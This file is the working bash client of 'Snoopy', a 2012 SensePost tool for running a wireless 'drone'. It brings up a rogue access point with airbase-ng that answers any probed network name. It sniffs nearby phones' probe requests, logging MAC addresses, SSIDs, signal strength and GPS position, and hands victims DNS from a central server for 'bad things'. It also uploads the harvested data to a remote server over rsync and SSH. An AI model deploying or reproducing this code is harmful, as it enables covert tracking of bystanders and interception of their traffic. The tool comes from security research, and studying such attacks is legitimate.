#!/bin/bash
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# This is the Snoopy client side script. It handles launching of the two main components:
# 1. The Rogue Access Point
# 2. The probe sniffer

############### Snoopy rogue access point component
# The rogue AP does the following:
# 1. Brings up a VPN connection to our Snoopy server
# 2. Loads injection drivers
# 3. Brings up a [promiscuous] rogue access point
# 4. Starts a DHCP server

# Notes: 
# a. DHCP is handled locally, but the DNS is set to the Snoopy server
#    This allows us to do 'bad things' with DNS at a cenrtal point.
# b. The DHCP lease file is uploaded, and inserted into the Snoopy server
# c. OpenVPN can operate in tunnel mode (layer3) or bridged mode (layer2)
#    Bridged mode could be used to put all drones on the same subnet, we'd
#    then be able to capture layer2 traffic on the Snoopy server.
#    However, in tests, this proved to be too much data over 3G.

# TODO: -Get dhcp_relay working on the N900 such that we can run a
# the DHCP daemon service on the Snoopy server.
#       -Add more security to the rsync process.
#       -Add watchdog to ensure everything is running properly

############### Snoopy Probe Sniffer component
# The probe sniffer component does the following:
# 1. Enables monitor mode on the interface
# 2. Captures probe requets, and log them to file
# 3. Rsync uploads this data every N seconds, where it is popuated into our database

# TODO:
# Input validation! APs with a CSV metadata may break things. Convert SSID to Hex maybe?
# Tshark needs to be upgraded in the Maemo repos - it's super old, and causes trouble.

snoopyDir=$(cd $(dirname "$0"); pwd)
cd $snoopyDir
source $snoopyDir/configs/config
save_path=$snoopyDir/snoopy_data/$device_id

#Procs for probesniff
t_pid=313373133
g_pid=313373133

#Procs for rogueAP
o_pid=313373133
a_pid=313373133
d_pid=313373133

#Rsync
s_pid=313373133

function rogue_sniff_hdr {
clear
echo -e "
+----------------------------------------------------------+
 	Snoopy Rogue Access Point and Probe Sniffer 
 +Interface: $iface
 +SSID: $ssid ($mode)
 +DeviceID: $device_id                                                            
 +VPN tunnel/sync server: $sync_server                                             
 +Date: `date`                                                                    
+----------------------------------------------------------+
"
check_tubes
}

function start_rogue_ap_hdr {
clear
mode="Promiscuous"
if [ "$promisc" != "true" ]; then mode="Non-promiscuous"; fi

echo -e "
+----------------------------------------------------------+
 		Snoopy Rogue Access Point. 
 +Interface: $iface
 +SSID: $ssid ($mode)
 +DeviceID: $device_id                                                            
 +VPN tunnel server: $sync_server                    
 +Date: `date`                                                                    
+----------------------------------------------------------+
"
check_tubes
}

function run_probe_sniffer_hdr {
clear
echo -e "
+----------------------------------------------------------+
 		Snoopy Probe Sniffer.
 +DeviceID: $device_id
 +SyncServer: $sync_server                          
 +Date: `date`                                                                    
+----------------------------------------------------------+
"
echo "[+] Checking Drone's internet connectivity..."
if ! echo "qbzunpxfyvxrntvey" | tr a-zA-Z n-za-mN-ZA-M | nc -v $sync_server 22 2> /dev/null 1> /dev/null; then echo "[!] Cannot connect to $sync_server, I'll proceed, and upload logs later"; fi
}

function check_tubes {
	echo "[+] Checking Drone's internet connectivity..."
	if ! echo "qbzunpxfyvxrntvey" | tr a-zA-Z n-za-mN-ZA-M | nc -v $sync_server 22 2> /dev/null 1> /dev/null; then echo "[!] Cannot connect to $sync_server. Check your internet connection (I'll keep trying)."; fi
	until echo "qbzunpxfyvxrntvey" | tr a-zA-Z n-za-mN-ZA-M | nc -v $sync_server 22 2> /dev/null 1> /dev/null; do sleep 2; done
}

# n900 has some special requirements/limitations
n900_sniff(){
	tshark -q -b filesize:512 -b files:1 -w ~/.tmp/probes -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |/usr/bin/gnu/sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
	t_pid=$!
}
linux_sniff(){
	tshark -q -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
	t_pid=$!
}


function run_probe_sniffer {
	if [ -z $location ]; then
        	echo -n "[-] Enter description (e.g.location): "
        	read location
	fi

	mkdir -p ~/.tmp/
	run_id=`date +%s`"_"$RANDOM
	while [ -r /tmp/snoopy_go ]
	do
        	echo "[*] Starting probe sniffer..."
        	if [[ "$arch" == "n900" ]]; then n900_sniff; elif [[ "$arch" == "linux" ]]; then linux_sniff; fi
		
        	while  kill -0 $t_pid &> /dev/null; do sleep 3; done
	done &

}

function run_probe_sniffer_old {

if [ -z $location ]; then
	echo -n "[-] Enter description (e.g.location): "
        read location
fi

echo "[*] Starting probe sniffer..."
run_id=`date +%s`"_"$RANDOM
#echo [+] Local data will be saved to $save_path
#echo [+] Remote data will be uploaded to $upload_path/$device_id
mkdir -p ~/.tmp/

if [[ "$arch" == "n900" ]]; then
                tshark -q -b filesize:512 -b files:1 -w ~/.tmp/probes -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |/usr/bin/gnu/sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &

        elif [[ "$arch" == "linux" ]]; then
		
                tshark -q -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
        fi
        t_pid=$!
	echo "[+] Client probe requests can be viewed via 'tail -f $save_path/probe_data.txt'"
}

function start_rogue_ap {

echo [+] Flushing iptables
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

# Bug when connecting over 3G on N900
if [ "$arch" == "n900" ]; then
        echo "nameserver 8.8.8.8" > /var/run/resolv.conf.gprs
fi
echo "nameserver 8.8.8.8" > /etc/resolv.conf

echo [+] Bringing up VPN...
openvpn --cd $snoopyDir/configs/openvpn/ --config openvpn.conf >> $save_path/vpn.log 2>&1  &
o_pid=$!
#/usr/bin/osso-xterm -e "sudo openvpn --cd $snoopy_path/configs/openvpn/ --config openvpn.conf"

until ifconfig | grep -q "tap0"; do sleep 2; done
echo [+] VPN interface seems to be up. Checking connectivity..
until ping -c 1 192.168.42.1>/dev/null; do sleep 3; done
echo [+] Connectivity to VPN server connection is savy. Testing Internet via VPN..
until ping -c 1 8.8.8.8>/dev/null; do sleep 3; done
echo [+] Connectivity beyond VPN server connection is savy. Let\'s rock.

sleep 1

echo [+] Starting rogue AP..
ra_cmd="airbase-ng -P -C 30 -c 3 -e $ssid $iface"
if [ "$promisc" != "true" ]; then
        ra_cmd="airbase-ng -c 3 -e $ssid $iface"
fi

echo "#-------------------------------------------------#" >> $save_path/rogueap.log
echo "# Rogue AP running `date`                         " >> $save_path/rogueap.log
echo "#-------------------------------------------------#" >> $save_path/rogueap.log
$ra_cmd >> $save_path/rogueap.log 2>&1 &
r_pid=$!

if [ "$arch" == "n900" ]; then
        echo "[+] Tailing rogue AP logs in new window.."
        /usr/bin/osso-xterm -e "tail -f $save_path/rogueap.log" &
else
        echo "[+] Associated client logs can be seen via 'tail -f $save_path/rogueap.log'"       
fi

until ifconfig -a| grep -q "at0"; do sleep 1; done
sleep 2
ifconfig at0 up $at0_ip netmask 255.255.0.0
until ifconfig | grep -q "at0"; do sleep 1; done
echo "1" > /proc/sys/net/ipv4/ip_forward
echo [+] Rogue AP interface is up.

#Rewrite the config file because of unknown $snoopy_store on server side
cat > $snoopyDir/configs/dnsmasq.conf << EOL
dhcp-range=$dhcpd_start,$dhcpd_end,$dhcpd_mask,8765h
dhcp-option=3,$at0_ip
dhcp-option=6,$vpn_tap_ip
dhcp-leasefile=$save_path/dhcpd.leases
EOL

echo [+] Starting DHCP server for rogue AP...
#dhcp-helper -b tap0 #Help me compile support for N900?

until ! [ "$(pidof dnsmasq)" ]; do killall dnsmasq; done
dnsmasq -a $at0_ip -i at0 -C $snoopyDir/configs/dnsmasq.conf
d_pid=$!
}

function gps_logger {
	if [ "$arch" == "n900" ]; then
		if [ "$delay_between_gps_checks" -ge "1" ]; then
			echo "[+] Starting GPS logger, with poll frequency $delay_between_gps_checks seconds"
			python $snoopyDir/bin/snoopy_gpslogger.py $save_path/coords.txt $delay_between_gps_checks $device_id,$run_id & &>/dev/null
			g_pid=$!
		else
			echo "[+] Not running GPS poll (frequency set to $delay_between_gps_checks)"
		fi
	fi

}

function kill_all {

	# Infinite loops check for the presence of this file
	rm /tmp/snoopy_go &>/dev/null

	# Rogue AP
	kill $d_pid &> /dev/null
	kill $o_pid &> /dev/null
	kill $r_pid &> /dev/null

	# Probe sniff
	kill $t_pid &> /dev/null
	kill $g_pid &> /dev/null 

	#Sync
	kill $s_pid &> /dev/null

	#sleep 1
	# Aggressive kill, comment out if you like
	killall -9 openvpn &> /dev/null
	killall -9 airbase-ng &> /dev/null
	killall -9 dnsmasq &> /dev/null
	killall -9 tshark &> /dev/null
	killall -9 tail &> /dev/null
	clear
}

#############################
# Functions to load/unload wireless drivers
# and enable/disable monitor/injection
# Drivers required to be in ./configs/drivers
function monitor_mode_on {
	if [[ "$arch" == "n900" ]]; then
		enable_monitor_mode

	elif [[ "$arch" == "linux" ]]; then
		airmon_create
	fi
}

function monitor_mode_off {
        if [[ "$arch" == "n900" ]]; then
                disable_monitor_mode

        elif [[ "$arch" == "linux" ]]; then
                airmon_destroy
        fi
}

function injection_on {
        if [[ "$arch" == "n900" ]]; then
		load_n900
        elif [[ "$arch" == "linux" ]]; then
        	airmon_create
	fi
}

function injection_off {
        if [[ "$arch" == "n900" ]]; then
		unload_n900
        elif [[ "$arch" == "linux" ]]; then
		airmon_destroy
        fi

}


#Enable monitor interface via airmon-ng
function airmon_create {
        echo "[+] Enabling monitor mode on $iface..."
        mon=$(airmon-ng start $iface| grep "monitor mode enabled on" | sed 's/.*enabled on \(.*\))/\1/')
        if [ -z "$mon" ]
        then
                        echo "[E] Unable to start monitor interface"
                        exit -1
        fi
	iface=$mon
#       echo $mon > /tmp/snoopy_mon.txt
}

#Disable monitor mode via airmon-ng
function airmon_destroy {
        echo "[+] Disabing monitor mode on $iface"
        for i in `airmon-ng | grep -v grep | grep phy | sed -e 's/^\(\w*\)\s.*/\1/'`; do airmon-ng stop $i &> /dev/null; done

}
#Put interface into monitor mode
function enable_monitor_mode {
        if ! iwconfig $iface |grep -q Monitor
        then
              echo [-] Enabling monitor mode on $iface
              ifconfig $iface down
              iwconfig $iface mode monitor
              ifconfig $iface up
              sleep 3
        fi

        if ! iwconfig $iface |grep -q Monitor
        then
              echo [E] Unable to enter monitor mode 
              sleep 2
        fi
}

function disable_monitor_mode {
        if iwconfig $iface |grep -q Monitor
        then
              echo [-] Disabling monitor mode on $iface
              ifconfig $iface down
              iwconfig $iface mode managed
              ifconfig $iface up
              sleep 3
        fi
        if iwconfig $iface |grep -q Monitor
        then
              echo [E] Unable to exit monitor mode 
              sleep 2
        fi

}

#Load N900 injection drivers
function load_n900 {
        echo "[+] Loading injection drivers for N900"
        if ! lsmod | grep -q wl1251
        then
                ifconfig wlan0 down
                rmmod wl12xx
                rmmod mac80211
                rmmod cfg80211
                cd $snoopyDir/configs/drivers/
                insmod compat.ko
                insmod rfkill_backport.ko
                insmod cfg80211.ko
                insmod mac80211.ko
                insmod wl1251.ko
                insmod wl1251_spi.ko
                iwconfig wlan0 mode monitor
                ifconfig wlan0 up
		cd $snoopyDir
        fi

        sleep 2
        if ! lsmod | grep -q wl1251
        then
                echo Unable to load injection drivers
                sleep 2
        fi
}
#Unload N900 injection drivers
function unload_n900 {
        echo "[+] Unloading injection drivers for N900"
        if lsmod | grep -q wl1251
        then
                cd $snoopyDir/configs/drivers/
                ifconfig wlan0 down
                rmmod wl1251_spi
                rmmod wl1251
                rmmod mac80211
                rmmod cfg80211
                rmmod rfkill_backport
                rmmod compat
                modprobe cfg80211
                modprobe mac80211
                modprobe wl12xx
                iwconfig wlan0 mode managed
                ifconfig wlan0 up
		cd $snoopyDir
        fi

        sleep 2
        if lsmod | grep -q wl1251
        then
                echo Unable to unload injection drivers
                sleep 2
        fi
}

# End wireless drivers functions
###########################################

# Rsync	
function sync {
	key=$snoopyDir/configs/ssh/id_rsa
	# Backgrounded
	# Will including $snoopyDir variable disable ability to specify absolute commands restricting rsync?
	while [ -r /tmp/snoopy_go ]; do rsync -e "ssh -i $key -o StrictHostKeyChecking=no" -rzt $snoopyDir/snoopy_data/ $sync_user@$sync_server:$upload_path &> /dev/null; sleep $delay_between_syncs; done &
	s_pid=$!
}


function run_stuff {
	tmp=$iface
	touch /tmp/snoopy_go
#	echo "[+] Bringing up $iface"
#	ifconfig $iface up	#just in case

	if [ "$probe" -eq "1" ]; then
		echo -n "Enter description (e.g. location): "
		read location
	fi

	if [ "$rogue" -eq "1" ] && [ "$probe" -eq "1" ]; then
		rogue_sniff_hdr
		injection_on
                start_rogue_ap
		run_probe_sniffer
		gps_logger
		
	elif [ "$probe" -eq "1" ]; then
		run_probe_sniffer_hdr
		monitor_mode_on
                run_probe_sniffer
		gps_logger

	elif [ "$rogue" -eq "1" ]; then
		start_rogue_ap_hdr
		injection_on
		start_rogue_ap
	fi
	sync
	echo "[+] All systems go. Press return to terminate."
	read
	kill_all
	injection_off
#	monitor_mode_off
#	kill_all
	iface=$tmp
}

function main_menu {
if ! ifconfig -a |grep -q "$iface"; then echo "[!] No such interface - '$iface'."; echo -n "Press any key to load configuration menu...";read -n 1;config_menu; fi
mode="Promiscuous"
if [ "$promisc" != "true" ]; then mode="Non-promiscuous"; fi
clear
echo -en "
+---------------------------------------------------------------+
|                    Welcome to Snoopy V0.1                     |
|                   	   MAIN MENU        		        |
|                                                               |
|              SensePost Information Security                   |
|         research@sensepost.com / www.sensepost.com	        |
+---------------------------------------------------------------+
DroneID: $device_id
WiFi: $iface
SSID: $ssid ($mode)
Arch: $arch

Would you like to:
[1] Run probe sniffer
[2] Run rogue access point
[3] Run both
[4] Configuration menu
[5] Set new random MAC address
[X] Exit

Option: "
        input=""
#        read -t 2 -n 1 input
#        if [[ -z $input ]]; then
#                return
#        fi

	read -n 1 input
        echo ""                 

        if [ "$input" == "1" ]; then
		probe=1
		rogue=0
		run_stuff
		
	elif [ "$input" == "2" ]; then
		probe=0
		rogue=1
		run_stuff
	
	elif [ "$input" == 3 ]; then
		probe=1
		rogue=1
		run_stuff

	elif [ "$input" == 4 ]; then
		conf_end=0
		while [ "$conf_end" -eq "0" ]
		do
        		config_menu
		done

        elif [ "$input" == "5" ]; then
                ifconfig $iface down
                macchanger -r $iface
                ifconfig $iface up
                sleep 1

	elif [[ "$input" == "x" || "$input" == "X" ]]; then
                echo "Bye..."
                kill_all
		clear
          	end
		end=1
        else
        echo '
               .-~~~~-.
              / __     \
             | /  \  /  `~~~~~-.
             ||    |  0         @
             ||    |  _.        |
             \|    |   \       /
              \    /  /`~~~~~~` \
              ('--'""`)         WOOF, BAD INPUT!
              /`"""""`\
        '
		sleep 1
        fi
	
	#main_menu

}

function config_wifi {
	echo "[+] Checking available WiFi devices.."
	# We ignore mon, what else should we ignore? ath?
	ifs=$(airmon-ng | grep -v grep | grep phy | grep -v mon| sed -e 's/^\(\w*\)\s.*/\1/')
	if [[ -z $ifs ]]; then
	        echo "[!] No suitable interfaces available!!"
		sleep 2
		return
	fi
	echo "[+] Which of the following interfaces would you like to use:"
	echo -e '\E[31;1m'$ifs'\E[0m'
	#echo $ifs
	echo -n "Option: "
	read input
	
	if [[ "$ifs" != *$input* ]]
	then   
	        echo "[!] You gave me a non-existent interface! I even gave you the options to choose from :(";
		config_wifi
	fi

	sed -i "s/^iface=.*/iface=$input/" $snoopyDir/configs/config	

}

function config_menu {
	source $snoopyDir/configs/config
	if [ "$promisc" != "true" ]; then 
		mode="Non-promiscuous"
	else
		mode="Promiscuous"
	fi
	clear
	echo -en "
+---------------------------------------------------------------+
|                    Welcome to Snoopy V0.1                     |
|                   DRONE CONFIGURATION MENU                    |
|                                                               |
|              SensePost Information Security                   |
|         research@sensepost.com / www.sensepost.com          	|
+---------------------------------------------------------------+
DroneID: $device_id
WiFi: $iface
SSID: $ssid ($mode)
Arch: $arch

Would you like to:
[1] Set WiFI device
[2] Set default SSID for rogue AP
[3] Toggle promiscuous mode for rogue AP
[4] Set GPS polling frequency
[X] Return to Main Menu

Option: "
	input=""
#	read -t 2 -n 1 input
#	if [[ -z $input ]]; then
#	        config_menu
#	fi

	read -n 1 input
	#echo $?

	echo ""                 
	
	if [ "$input" == "1" ]; then
	        config_wifi
	elif [ "$input" == "2" ]; then
		echo -n "Enter new SSID: "
		read input
		sed -i "s/^ssid=.*/ssid=$input/" $snoopyDir/configs/config
	elif [ "$input" == "3" ]; then
		echo "Toggling.."
		if [ "$promisc" == "true" ]; then
			sed -i "s/^promisc=.*/promisc=false/" $snoopyDir/configs/config
		else
			sed -i "s/^promisc=.*/promisc=true/" $snoopyDir/configs/config
		fi
	elif [ "$input" == "4" ]; then
		echo -n "GPS currently polls every $delay_between_gps_checks seconds. New frequency (0 to disable): "
		read t
		sed -i "s/^delay_between_gps_checks=.*/delay_between_gps_checks=$t/" $snoopyDir/configs/config
		echo "Set"
	elif [[ "$input" == "x" || "$input" == "X" ]]; then
		conf_end=1
		return
	else   
        echo '
               .-~~~~-.
              / __     \
             | /  \  /  `~~~~~-.
             ||    |  0         @
             ||    |  _.        |
             \|    |   \       /
              \    /  /`~~~~~~` \
              ('--'""`)         WOOF, BAD INPUT!
              /`"""""`\
        '

	fi

	config_menu

}

function end {
if [ "$arch" == "n900" ]; then
echo "+---------------------------------------------------------------+
| SensePost Snoopy // 2012					|
|								|
|                  __---__                         ______	|
|                 /    ___\_             o  O  O _(      )__	|
|                /====(_____\___---_  o        _(           )_	|
|               |                    \        (_   Hack the   )	|
|               |                     |@        (_   Planet!  _)|
|                \       ___         /           (__        __)	|
|   \ __----____--_\____(____\_____/                (______)	|
|  ==|__----____--______|					|
|   /              /    \____/)_				|
|                /        ______)				|
|               /           |  |				|
|              |           _|  |				|
|         ______\______________|______				|
|        /                    *   *   \				|
|       /_____________*____*___________\			|
|			     http://www.sensepost.com/research	|
|			     research@sensepost.com		|
+---------------------------------------------------------------+"
else
echo "+---------------------------------------------------------------+
| SensePost Snoopy // 2012                                      |
|                                                               |
|                  __---__                         ______       |
|                 /    ___\_             o  O  O _(      )__    |
|                /====(_____\___---_  o        _(           )_  |
|               |                    \        (_   Hack the   ) |
|               |                     |@        (_   Planet!  _)|
|                \       ___         /           (__        __) |
|   \ __----____--_\____(____\_____/                (______)    |
|  ==|__----____--______|                                       |
|   /              /    \____/)_                                |
|                /        ______)                               |
|               /           |  |                                |
|              |           _|  |                                |
|         ______\______________|______                          |
|        /                    *   *   \                         |
|       /_____________*____*___________\                        |
|       /   *     *                    \                        |
|      /________________________________\                       |
|      / *                              \                       |
|     /__________________________________\                      |
|          |                        |                           |
|          |________________________|                           |
|          |                        |                           |
|          |________________________|                           |
|                                                               |
|                            http://www.sensepost.com/research  |
|                            research@sensepost.com             |
+---------------------------------------------------------------+"
fi

echo -n "Press any key to exit..."
read -n 1
}

control_c()
# run if user hits control-c
{
  echo -en "\n*** Ouch! Exiting ***\n"
  sleep 1
  kill_all
  end
  exit
}
trap control_c SIGINT



end=0
while [ "$end" -eq "0" ]
do
	main_menu
done
